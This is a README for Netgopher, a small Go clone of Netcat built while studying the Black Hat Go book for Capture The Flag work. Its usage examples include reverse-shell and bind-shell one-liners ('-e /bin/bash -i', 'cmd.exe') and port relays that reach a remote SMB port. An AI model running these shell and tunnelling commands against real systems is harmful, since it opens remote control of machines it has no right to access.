# Netgopher

This is a basic Go implementation of (bits of) Netcat, produced while working through the very-excellent [NoStarch Press Black Hat Go book](https://nostarch.com/blackhatgo). This implementation is TCP only, with limited features, but does everything I want Netcat to do during Capture The Flag exercises, including simpler (eye of the beholder!) port realying. 

## Usage

Netgopher allows you to connect to things together; these could be a bind listener, a TCP connection, an Operating System command, or the Stdin and Stdout of the console you're working in. Any connection must be specified in the *HOST:PORT* syntax and any OS command must be quoted as appropriate:

```
❯ ng                                                                                                 ─╯
Usage of ng:
  -c value
        Make a TCP Connection : -c 127.0.0.1:8080
  -e string
        Execute a command (quote) : -e '/bin/bash -i'
  -h    Print detailed usage.
  -l value
        Listen on a port : -l 4444
  -v    Display detailed progress messages.
```

## Examples

The simplest examples are the classic netcat usages, like connecting to a listening port on a remote host. You can try this out with a pair of listeners:

![Listener & connect example image](assets/basic.gif)

Some really common use cases I have are:

Start an interactive Bash shell and connect back to a remote listener:
```
# Start a listener on your remote machine
❯ ng -l 1234
# Start the shell
❯ ng -c remote_host:1234 -e '/bin/bash -i'
```

Or start the same shell on a bind listener; this is useful because you can create as many conenctions as you like - if your shell drops, just re-connect.
```
❯ ng -l 1234 -e 'cmd.exe'
# Now connect up to the shell
❯ ng -c serving_host:1234
C:\Windowss\system32>
^C
# Oh no! Your shell dropped - try again:
❯ ng -c serving_host:1234
C:\Windowss\system32>

```

Forward a TCP port back to a remote listener:
```
# Start a relay on your local host
❯ ng -l 1234 -l 445
# On your remote host, forward a connection to local port 445
❯ ng -c remote_host:1234 -c 127.0.0.1:445
# Your local machine now has access to that remote port 445 on 127.0.0.1:445
```

Port 'spoofing' - Forward incoming connections to local port:
```
# Listen on port 1234 and forward connections to ssh server
❯ ng -l 1234 -c 127.0.0.1:22
```
